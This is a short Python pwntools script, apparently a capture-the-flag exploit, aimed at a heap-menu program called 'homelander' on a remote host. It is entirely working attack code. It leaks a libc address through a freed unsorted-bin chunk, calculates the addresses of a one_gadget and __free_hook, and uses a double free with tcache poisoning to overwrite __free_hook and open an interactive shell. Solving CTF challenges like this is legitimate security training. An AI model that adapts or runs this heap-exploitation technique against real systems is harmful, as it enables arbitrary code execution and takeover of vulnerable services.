

from pwn import *

p = remote('203.34.119.237', 11340)
# p = process('./homelander')

def add(n, size, text):
	p.sendlineafter('Choice: ', '1')
	p.sendlineafter('(1-16): ', str(n))
	p.sendlineafter('Length: ', str(size))
	p.sendlineafter('Text: ', str(text))

def edit(n, text):
	p.sendlineafter('Choice: ', '2')
	p.sendlineafter('(1-16): ', str(n))
	p.sendlineafter('Text: ', str(text))

def view(n):
	p.sendlineafter('Choice: ', '3')
	p.sendlineafter('(1-16): ', str(n))

def erase(n):
	p.sendlineafter('Choice: ', '4')
	p.sendlineafter('(1-16): ', str(n))

add(1, 0x100, "asd")
add(2, 0x10, "asd")

for i in range(3, 10):
	add(i, 0x100, "asd")

for i in range(3, 10):
	erase(i)

erase(1)
view(1)
leak = int(p.recvuntil('\x7f')[-6:][::-1].encode('hex'), 16)

print "LIBC LEAK"
print hex(leak)

main_arena_offset = -0x3ebca0

print "LIBC BASE"
libc_base = leak + main_arena_offset
print hex(libc_base)

print "ONE GADGET"
one_gadget_address = libc_base + 0x4f322
print hex(one_gadget_address)

print "FREE HOOK"
free_hook_address = libc_base + 0x00000000003ed8e8
print hex(free_hook_address)

erase(2)
erase(2)
add(10, 0x10, p64(free_hook_address))

add(11, 0x10, "asd")
add(12, 0x10, p64(one_gadget_address))

erase(1)

p.interactive()
p.close()